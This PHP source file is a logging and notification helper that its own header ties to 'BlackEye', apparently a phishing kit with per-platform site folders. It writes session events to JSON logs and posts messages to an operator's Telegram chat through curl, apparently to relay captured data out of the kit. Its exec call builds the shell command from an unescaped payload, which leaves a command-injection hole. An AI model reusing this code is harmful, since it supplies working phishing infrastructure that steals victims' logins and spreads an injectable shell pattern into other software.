<?php
// logger.php – shared helper for BlackEye PHP scripts

/**
 * Write a JSON line to the session log file.
 * The Bash wrapper exports LOG_FILE pointing to a file like
 *   sites/<platform>/logs/<timestamp>.json
 */
function log_event(string $type, array $data): void {
    $logFile = getenv('LOG_FILE');
    if (!$logFile) {
        // Fallback: write to a generic file in the script directory
        $logFile = __DIR__ . '/default_log.json';
    }
    $entry = array_merge([
        'timestamp' => date('c'),
        'type'      => $type,
    ], $data);
    $json = json_encode($entry, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
    if ($json !== false) {
        file_put_contents($logFile, $json . PHP_EOL, FILE_APPEND | LOCK_EX);
    }
}

/**
 * Send a simple Telegram message if credentials are set.
 */
function tg_notify(string $message): void {
    $botToken = getenv('TELEGRAM_BOT_TOKEN');
    $chatId   = getenv('TELEGRAM_CHAT_ID');
    if (!$botToken || !$chatId) {
        return; // Telegram not configured – silent noop
    }
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $payload = http_build_query([
        'chat_id' => $chatId,
        'text'    => $message,
        'parse_mode' => 'HTML',
    ]);
    // Use curl via exec to avoid PHP extensions requirement
    $cmd = "curl -s -X POST -d '{$payload}' '{$url}'";
    exec($cmd);
}
?>
